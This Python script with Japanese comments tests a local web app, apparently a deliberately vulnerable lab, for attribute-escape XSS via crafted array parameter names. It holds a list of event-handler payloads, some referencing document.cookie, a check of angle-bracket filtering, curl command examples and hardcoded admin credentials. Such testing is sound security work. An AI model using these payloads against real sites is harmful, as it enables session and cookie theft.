#!/usr/bin/env python3
"""
配列パラメータ属性脱出XSS脆弱性のテスト

修正された脆弱性:
- ><は使用不可
- "を使って属性から脱出するXSS
- レスポンスで"が使われるHTML構造

攻撃例: address["onmouseover=alert(1)]
"""

import requests
import sys

def test_attribute_escape_xss():
    """属性脱出型XSS脆弱性をテスト"""
    
    base_url = "http://localhost:5000"
    
    # ログイン用のセッション
    session = requests.Session()
    
    print("🔒 属性脱出型配列パラメータXSS脆弱性テスト")
    print("=" * 50)
    
    try:
        # 1. ログイン
        print("1. ログイン中...")
        login_data = {
            'username': 'admin',
            'password': 'admin123'
        }
        
        login_response = session.post(f"{base_url}/login", data=login_data)
        
        if login_response.status_code != 200:
            print("❌ ログインに失敗しました")
            return False
        
        print("✅ ログイン成功")
        
        # 2. 属性脱出型XSSペイロードテスト
        print("\n2. 属性脱出型XSSペイロードを送信...")
        
        # 攻撃ペイロード（"を使って属性から脱出）
        payloads = [
            # 基本的な属性脱出
            '"onmouseover=alert(1)',
            '"onfocus=alert(1)',
            '"onclick=alert(1)',
            '"onload=alert(1)',
            
            # より複雑な属性脱出
            '"onmouseover=alert(document.domain)',
            '"onfocus=alert(document.cookie)',
            '"style="color:red"onmouseover="alert(1)',
            
            # エラーイベント
            '"onerror=alert(1)',
            '"onabort=alert(1)',
            
            # タイミング系
            '"ontimeupdate=alert(1)',
            '"oncanplay=alert(1)',
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n--- テスト {i}: {payload} ---")
            
            # プロフィール編集データ
            profile_data = {
                'email': 'admin@example.com',
                'address': '東京都渋谷区',
                'phone': '090-1234-5678',
                f'address[{payload}]': 'test_value'  # 攻撃ペイロード
            }
            
            # POSTリクエスト送信
            edit_response = session.post(f"{base_url}/user/profile/edit", data=profile_data)
            
            if edit_response.status_code == 200:
                print("✅ リクエスト送信成功")
                
                # プロフィールページを確認
                profile_response = session.get(f"{base_url}/user/profile")
                
                if profile_response.status_code == 200:
                    content = profile_response.text
                    
                    # XSSペイロードが反映されているか確認
                    if payload in content:
                        print(f"🚨 XSS脆弱性確認: {payload}")
                        print(f"   レスポンスにペイロードが含まれています")
                        
                        # HTMLの該当部分を抽出
                        lines = content.split('\n')
                        for line_num, line in enumerate(lines):
                            if payload in line:
                                print(f"   行 {line_num + 1}: {line.strip()}")
                        
                    else:
                        print("ℹ️  ペイロードは反映されませんでした")
                else:
                    print("❌ プロフィールページの取得に失敗")
            else:
                print(f"❌ リクエスト送信失敗: {edit_response.status_code}")
        
        # 3. フィルタ回避テスト
        print("\n3. フィルタ回避テスト（><禁止確認）...")
        
        blocked_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '><script>alert(1)</script>',
            'test>alert(1)<test'
        ]
        
        for payload in blocked_payloads:
            print(f"\n--- ブロック対象: {payload} ---")
            
            profile_data = {
                'email': 'admin@example.com',
                'address': '東京都渋谷区',
                'phone': '090-1234-5678',
                f'address[{payload}]': 'test_value'
            }
            
            edit_response = session.post(f"{base_url}/user/profile/edit", data=profile_data)
            
            if edit_response.status_code == 200:
                if "不正な文字が検出されました" in edit_response.text:
                    print("✅ フィルタが正常に動作（><がブロックされました）")
                else:
                    print("⚠️  フィルタが動作していない可能性があります")
            else:
                print(f"❌ リクエスト送信失敗: {edit_response.status_code}")
        
        print("\n" + "=" * 50)
        print("✅ 属性脱出型配列パラメータXSSテスト完了")
        return True
        
    except Exception as e:
        print(f"❌ テスト中にエラーが発生しました: {e}")
        return False

def generate_curl_examples():
    """cURLコマンド例を生成"""
    print("\n📋 cURLコマンド例:")
    print("=" * 30)
    
    curl_examples = [
        {
            "name": "基本的な属性脱出XSS",
            "payload": '"onmouseover=alert(1)',
            "description": "マウスオーバーでalert実行"
        },
        {
            "name": "フォーカスイベントXSS", 
            "payload": '"onfocus=alert(document.domain)',
            "description": "フォーカス時にドメイン表示"
        },
        {
            "name": "クリックイベントXSS",
            "payload": '"onclick=alert(document.cookie)',
            "description": "クリック時にクッキー表示"
        },
        {
            "name": "複合属性脱出",
            "payload": '"style="color:red"onmouseover="alert(1)',
            "description": "スタイル属性と組み合わせた脱出"
        }
    ]
    
    for example in curl_examples:
        print(f"\n### {example['name']}")
        print(f"説明: {example['description']}")
        print("```bash")
        print(f"curl -X POST http://localhost:5000/user/profile/edit \\")
        print(f"  -H \"Content-Type: application/x-www-form-urlencoded\" \\")
        print(f"  -H \"Cookie: session=YOUR_SESSION_COOKIE\" \\")
        print(f"  --data-urlencode \"email=admin@example.com\" \\")
        print(f"  --data-urlencode \"address=東京都渋谷区\" \\")
        print(f"  --data-urlencode \"phone=090-1234-5678\" \\")
        print(f"  --data-urlencode \"address[{example['payload']}]=test_value\"")
        print("```")

if __name__ == "__main__":
    print("🔒 配列パラメータ属性脱出XSS脆弱性テスト")
    print("=" * 50)
    
    if len(sys.argv) > 1 and sys.argv[1] == "curl":
        generate_curl_examples()
    else:
        # サーバーが起動しているかチェック
        try:
            response = requests.get("http://localhost:5000", timeout=5)
            print("✅ サーバーが起動しています")
            test_attribute_escape_xss()
        except requests.exceptions.RequestException:
            print("❌ サーバーが起動していません。python run.py を実行してください。")
            print("\ncURLコマンド例を表示します:")
            generate_curl_examples()